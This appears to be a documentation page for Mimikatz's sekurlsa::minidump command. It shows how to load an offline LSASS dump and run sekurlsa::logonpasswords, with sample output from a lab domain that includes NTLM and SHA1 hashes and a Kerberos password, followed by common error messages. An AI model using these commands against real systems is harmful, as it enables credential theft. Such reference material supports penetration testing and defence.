# minidump

It can be used against a dumped LSASS process file and it does not require administrative privileges. It's considered as an "offline" dump.

```
mimikatz # sekurlsa::minidump file.dmp
```

```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 3113147 (00000000:002f80bb)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 13/10/2021 20:58:06
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : WIN10$
         * Domain   : hacklab
         * NTLM     : 2c60cae5c83d27b349e98662de463dfc
         * SHA1     : fd6e6c6616156dac734f87d1eec386fa29537d89
        tspkg :
        wdigest :
         * Username : WIN10$
         * Domain   : hacklab
         * Password : (null)
        kerberos :
         * Username : WIN10$
         * Domain   : hacklab.local
         * Password : 8us/0-5sE3:_bd4\B+nEqpI#j,[avKJ'7l5RpDew]EEXya=tZq7g,jAifx%-sgv)Seto+@aPtf];gmb=gSE4K?"D\B+ CBW>vD5*/k71q'iI#V4$otG4t9R[
        ssp :
        credman :
        cloudap :       KO
```

**According to Benjamin the following errors might be raised:**

* `ERROR kuhl_m_sekurlsa_acquireLSA ; Minidump pInfos->MajorVersion (A) != MIMIKATZ_NT_MAJOR_VERSION (B)` minidump is opened from a Windows NT of another major version (_NT5_ vs _NT6_).
* `ERROR kuhl_m_sekurlsa_acquireLSA ; Minidump pInfos->ProcessorArchitecture (A) != PROCESSOR_ARCHITECTURE_xxx (B)` minidump is opened from a Windows NT of another architecture (_x86_ vs _x64_).
* `ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)` The minidump file is not found (check path).
